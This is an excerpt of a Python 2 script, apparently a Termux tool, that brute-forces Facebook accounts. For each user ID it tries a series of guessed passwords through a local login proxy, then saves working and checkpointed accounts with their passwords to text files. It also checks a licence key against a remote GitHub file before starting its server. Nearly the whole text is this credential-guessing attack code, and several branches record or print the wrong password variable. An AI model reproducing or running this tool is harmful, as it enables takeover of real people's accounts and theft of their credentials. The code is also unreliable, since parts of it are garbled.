...
os.system('clear')
logo = """
\033[1;91m .d8b.  .d8888.  d888b   db   db  .d8b   d8888b.
\033[1;93m d8' `8b 88'  YP 88' Y8b 88   88 d8' `8b 88  `8D
\033[1;92m 88ooo88 `8bo.   88      88ooo88 88ooo88 88oobY'
\033[1;94m 88~~~88   `Y8b. 88  ooo 88~~~88 88~~~88 88`  8b
\033[1;91m 88   88 db   8D 88. ~8~ 88   88 88   88 88 ` 88.
\033[1;92m YP   YP `8888Y'  Y888P  YP   YP YP   YP 88   YD
\033[1;94m===============================================
\033[1;90m➣ Author : \033[1;91mAsghar Latif
\033[1;90m➣ Github : \033[1;93mhttps://github.com/asgharmalik37
\033[1;90m➣ Fb id  : \033[1;94mAsghar Latif
\033[1;94m==============================================="""
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/AK-KiNg-60/ak-yousafzai/main/server.txt').text
    if to in r:
        os.system('cd ..... && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
...
def a_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \033[1;97m╰─ASGHAR➤ ')
    if a_s == '1':
        os.system('clear')
        print logo
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\033[1;92mMalik Asghar Latif\033[1;94m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;95m[ASGHAR-OK]➤ ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\033[1;91m[ASGHAR-CP]➤ ' + uid + ' | ' + pass1
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;95m[ADGHAR-OK]➤ ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;91m[ASGHAR-CP]➤ ' + uid + ' | ' + pass2
                    cp = open('HOP_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;95m[ASGHAR-OK]➤ ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;91m[ASGHAR-CP]➤ ' + uid + ' | ' + pass3
                        cp = open('HOP_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;95m[Asghar-OK]➤ ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;97m[Asghar-CP]➤ ' + uid + ' | ' + pass4
                            cp = open('HOP_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                    ...
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers = header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;95m[ASGHAR-OK]➤ ' + uid + ' | ' + pass5
                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass5 + '\n')
                            ok.close()
                            oks.append(uid + pass5)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;91m[ASGHAR-CP]➤ ' + uid + ' | ' + pass5
                            cp = open('HOP_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass5 + '\n')
                            cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;95m[ASGHAR-OK]➤ ' + uid + ' | ' + pass6
                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass6 + '\n')
                            ok.close()
                            oks.append(uid + pass6)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;91m[ASGHAR-CP]➤ ' + uid + ' | ' + pass6
                            cp = open('HOP_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;95m[ASGHAR-OK]➤ ' + uid + ' | ' + pass7
                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass7)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;91m[ASGHAR-CP]➤ ' + uid + ' | ' + pass4
                            cp = open('HOP_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass7 + '\n')
                            cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;95m[ASGHAR-OK]➤ ' + uid + ' | ' + pass8
                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass8 + '\n')
                            ok.close()
                            oks.append(uid + pass8)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;91m[ASGHAR-CP]➤ ' + uid + ' | ' + pass8
                            cp = open('HOP_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;95m[ASGHAR-OK]➤ ' + uid + ' | ' + pass9
                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass9 + '\n')
                            ok.close()
                            oks.append(uid + pass9)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;91m[ASGHAR-CP]➤ ' + uid + ' | ' + pass9
                            cp = open('HOP_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;95m[ASGHAR-OK]➤ ' + uid + ' | ' + pass10
                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass10 + '\n')
                            ok.close()
                            oks.append(uid + pass10)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;91m[ASGHAR-CP]➤ ' + uid + ' | ' + pass10
                            cp = open('HOP_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass10 + '\n')
                            cp.close()
    ...
    p.map(main, id)
    print 47 * '-'
    print ' \033[1;92mGood-bye Malik Asghar'
